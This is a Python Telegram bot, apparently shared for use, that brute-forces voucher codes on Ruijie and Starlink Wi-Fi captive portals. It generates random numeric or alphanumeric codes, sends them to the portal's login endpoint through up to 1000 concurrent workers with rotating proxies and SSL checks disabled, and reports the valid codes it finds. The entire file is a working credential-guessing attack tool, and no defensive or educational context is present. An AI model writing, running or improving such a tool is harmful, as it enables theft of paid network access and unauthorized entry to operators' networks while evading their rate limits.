import os
import logging
import asyncio
import aiohttp
import random
import string
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def load_proxies_from_file():
    filenames = ["Proxy.txt", "proxy.txt", "proxies.txt", "proxy_list.txt", "list.txt"]
    proxies = []
    for filename in filenames:
        if os.path.exists(filename):
            try:
                with open(filename, "r", encoding="utf-8") as f:
                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                    if proxies:
                        print(f"[ProxyManager] Loaded {len(proxies)} proxies from {filename}")
                        return proxies
            except Exception as e:
                print(f"[ProxyManager] Error reading {filename}: {e}")
                
    fallback_proxies = [
        "103.152.112.15:8080",
        "182.253.150.2:3128",
        "202.137.7.12:80",
        "114.6.14.31:8080"
    ]
    print("[ProxyManager] Warning: Using default fallback proxies.")
    return fallback_proxies

scanning_states = {}
user_modes = {}
user_workers = {}
user_portals = {}
user_proxies = {}
proxy_indices = {}
found_codes = {}
current_codes_tracker = {}
tried_counters = {}
expired_counters = {}
limits_counters = {}

def show_startup_banner():
    print("=" * 65)
    print("  ⚡  RUIJIE & STARLINK EXTREME VOUCHER SCANNER  ⚡")
    print("=" * 65)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in user_modes:
        user_modes[chat_id] = "num6"
    if chat_id not in user_workers:
        user_workers[chat_id] = 500
    
    if chat_id not in user_proxies or not user_proxies[chat_id]:
        user_proxies[chat_id] = load_proxies_from_file()
    
    if chat_id not in proxy_indices:
        proxy_indices[chat_id] = 0
        
    total_proxies = len(user_proxies.get(chat_id, []))
    current_proxy_display = f"{total_proxies}/{total_proxies}" if total_proxies > 0 else "0/0"
    
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal Link", callback_data="update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
        [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
        [InlineKeyboardButton(f"🔀 Proxies: {current_proxy_display}", callback_data="add_proxies")],
        [InlineKeyboardButton("🚀 Start Scanner By Kage", callback_data="start_scanner")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        "⚡ Starlink Scanner Control Panel ⚡\n\n"
        f"⚙ Current Mode: {user_modes[chat_id]}\n"
        f"🔧 Workers: {user_workers[chat_id]}\n"
        f"📁 Proxy File: Proxy.txt\n"
        f"🔀 Proxies: {current_proxy_display}"
    )
    
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup)
    elif update.callback_query:
        try:
            await update.callback_query.message.edit_text(text, reply_markup=reply_markup)
        except Exception:
            pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    chat_id = query.message.chat_id
    data = query.data
    
    if data == "update_portal":
        await query.answer()
        context.user_data['waiting_for'] = 'portal'
        await query.message.reply_text("🔗 Portal URL ကို ပို့ပေးပါ:")
    
    elif data == "change_mode":
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("Num 6", callback_data="mode_num6"), InlineKeyboardButton("Num 7 Kage", callback_data="mode_num7"), InlineKeyboardButton("Num 8 Kage", callback_data="mode_num8")],
            [InlineKeyboardButton("Num 9", callback_data="mode_num9"), InlineKeyboardButton("Abc 6", callback_data="mode_abc6")],
            [InlineKeyboardButton("Mix6 Formula", callback_data="mode_mix6"), InlineKeyboardButton("Mix7 Random", callback_data="mode_mix7")],
            [InlineKeyboardButton("🔙 Back", callback_data="mode_back")]
        ]
        await query.message.edit_text("⚙ Choose Scanner Mode", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith("mode_"):
        await query.answer()
        selected_mode = data.replace("mode_", "")
        if selected_mode == "back":
            await start(update, context)
        else:
            user_modes[chat_id] = selected_mode
            await start(update, context)
            
    elif data == "change_workers":
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("500", callback_data="worker_500"), InlineKeyboardButton("800", callback_data="worker_800")],
            [InlineKeyboardButton("1000", callback_data="worker_1000"), InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
        ]
        await query.message.edit_text("⚙️ Choose Worker Count", reply_markup=InlineKeyboardMarkup(keyboard))
        
    elif data.startswith("worker_"):
        await query.answer()
        selected = data.replace("worker_", "")
        if selected == "back":
            await start(update, context)
        else:
            user_workers[chat_id] = int(selected)
            await start(update, context)

    elif data == "add_proxies":
        all_proxies = user_proxies.get(chat_id, [])
        if not all_proxies:
            all_proxies = load_proxies_from_file()
            user_proxies[chat_id] = all_proxies
        await query.answer("Proxies updated successfully!")
        await start(update, context)
    
    elif data == "start_scanner":
        await query.answer()
        portal = user_portals.get(chat_id)
        if not portal:
            await query.message.reply_text("⚠️ ပထမဦးစွာ Portal URL ကို အရင် Update လုပ်ပါ။")
            return
        if scanning_states.get(chat_id, False):
            await query.message.reply_text("⚠ စကင်န်ဖတ်ခြင်း လုပ်ဆောင်ဆဲ ဖြစ်ပါသည်။")
            return
        asyncio.create_task(run_scanner_with_workers(query, context, portal))
        
    elif data == "stop_scanner_btn":
        await query.answer("🛑 ရပ်တန့်နေပါပြီ...")
        scanning_states[chat_id] = False

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    if context.user_data.get('waiting_for') == 'portal':
        user_portals[chat_id] = text
        context.user_data['waiting_for'] = None
        await update.message.reply_text("✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။")
        await start(update, context)

def generate_code_by_mode(mode):
    length = 6
    for char in mode:
        if char.isdigit():
            length = int(char)
            break
    if "num" in mode:
        return "".join(random.choices(string.digits, k=length))
    elif "mix" in mode:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
    elif "abc" in mode:
        return "".join(random.choices(string.ascii_lowercase, k=length))
    return "".join(random.choices(string.digits, k=length))

async def worker_task(worker_id, session, portal_url, chat_id):
    while scanning_states.get(chat_id, False):
        mode = user_modes.get(chat_id, "num6")
        code_val = generate_code_by_mode(mode)
        tried_counters[chat_id] = tried_counters.get(chat_id, 0) + 1
        current_codes_tracker[chat_id] = code_val
        
        proxies_list = user_proxies.get(chat_id, [])
        proxy = None
        if proxies_list:
            idx = (proxy_indices.get(chat_id, 0) + worker_id) % len(proxies_list)
            proxy = proxies_list[idx]
            
        if proxy and not proxy.startswith("http"):
            proxy = f"http://{proxy}"
            
        try:
            clean_portal = portal_url.replace("stage=portal", "stage=login")
            if "?" not in clean_portal:
                clean_portal += "?"
            
            target_url = f"{clean_portal}&token={code_val}"
            async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
                html_content = await response.text()
                lower_html = html_content.lower()
                
                # တကယ့် ကုဒ်အမှန်ဖြစ်မှသာ လက်ခံရန် တင်းကျပ်သော စစ်ဆေးချက်များ (Strict Validation)
                is_real_hit = (
                    response.status == 200 and
                    any(k in lower_html for k in ["success", "authenticated", "auth_pass", "login successfully"]) and
                    not any(e in lower_html for e in ["error", "fail", "invalid", "expired", "wrong", "incorrect", "portal", "login"])
                )
                
                if is_real_hit:
                    if chat_id not in found_codes:
                        found_codes[chat_id] = []
                    if code_val not in found_codes[chat_id]:
                        found_codes[chat_id].append(code_val)
                elif any(kw in lower_html for kw in ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]):
                    expired_counters[chat_id] = expired_counters.get(chat_id, 0) + 1
                elif any(kw in lower_html for kw in ["limit", "already logged", "in use", "too many", "blocked"]):
                    limits_counters[chat_id] = limits_counters.get(chat_id, 0) + 1
        except Exception:
            pass
        await asyncio.sleep(0.001)

async def run_scanner_with_workers(query, context, portal_url):
    chat_id = query.message.chat_id
    scanning_states[chat_id] = True
    found_codes[chat_id] = []
    tried_counters[chat_id] = 0
    expired_counters[chat_id] = 0
    limits_counters[chat_id] = 0
    
    start_time = time.time()
    workers_count = user_workers.get(chat_id, 500)
    
    stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
    status_message = await query.message.reply_text("⚡ Scanner Running ...\nThank for using Telegram @Kage", reply_markup=stop_keyboard)
    
    connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker_task(i, session, portal_url, chat_id)) for i in range(workers_count)]
        
        while scanning_states.get(chat_id, False):
            await asyncio.sleep(1.0)
            tried = tried_counters.get(chat_id, 0)
            expired = expired_counters.get(chat_id, 0)
            limits = limits_counters.get(chat_id, 0)
            elapsed = time.time() - start_time
            speed = (tried / elapsed * 60) if elapsed > 0 else 0.0
            hits_list = found_codes.get(chat_id, [])
            
            hits_str = "\n".join([f"🔥 {code} | Valid" for code in hits_list[-5:]]) if hits_list else "None yet"
            
            live_text = (
                "⚡ Scanner Running ⚡\n"
                "Thank for using By Telegram @Kage\n\n"
                f"🏹 Tried: {tried:,}\n"
                f"🎯 Current Code: {current_codes_tracker.get(chat_id, '000000')}\n"
                f"🔥 Real Hits: {len(hits_list)} BY @Kage ကုဒ်စစ်\n"
                f"❌ Expired: {expired}\n"
                f"⚠️ Limits: {limits}\n"
                f"⚡ Speed: {speed:,.1f} c/m\n"
                "___________________\n"
                f"🔥 Verified Hit Codes:\n{hits_str}"
            )
            try:
                await status_message.edit_text(live_text, reply_markup=stop_keyboard)
            except Exception:
                pass
        for t in tasks:
            t.cancel()

    final_hits = found_codes.get(chat_id, [])
    final_text = f"🛑 ပြီးဆုံးပါပြီ။\n\n"
    if final_hits:
        final_text += "🔥 Verified Hit Codes Found:\n" + "\n".join(final_hits)
    else:
        final_text += "ℹ️ စစ်မှန်သော Code အစစ်အမှန် မတွေ့ရှိသေးပါ။"
    await query.message.reply_text(final_text)

def main():
    show_startup_banner()
    token = os.environ.get("BOT_TOKEN")
    if not token:
        print("Error: BOT_TOKEN missing in Secrets.")
        return
    app = ApplicationBuilder().token(token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    app.run_polling()

if __name__ == '__main__':
    main()
        
